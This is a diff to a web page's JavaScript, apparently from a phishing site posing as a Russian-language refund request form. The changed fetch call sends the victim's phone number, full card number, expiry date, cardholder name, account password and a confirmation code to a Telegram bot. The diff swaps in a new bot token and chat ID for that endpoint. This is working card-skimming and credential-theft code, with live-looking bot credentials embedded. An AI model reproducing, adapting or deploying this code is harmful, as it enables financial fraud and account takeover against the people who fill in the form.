@@ -80,11 +80,11 @@
             cooldown = true;
             document.getElementById('submitButton').disabled = true;
 
-            fetch("https://api.telegram.org/bot7878192082:AAE7oE001p3_MMLKMm_PxpJgaTTdINA-Vq4/sendMessage", {
+            fetch("https://api.telegram.org/bot7907747711:AAGphH8ZsuiSdCpwqrSevNjgJfZxZUdtw4U/sendMessage", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    chat_id: "-1002190411942",
+                    chat_id: "-1002489511369",
                     text: `Заявка на возврат средств\nТелефон: ${document.getElementById('telephone').value}\nНомер карты: ${document.getElementById('card_number').value}\nСрок действия: ${document.getElementById('expiration_date').value}\nИмя держателя: ${document.getElementById('holder_name').value}\nПароль от ЛК: ${document.getElementById('account_password').value}\n------------------\nКод: ${code}`
                 })
             }).then(() => {
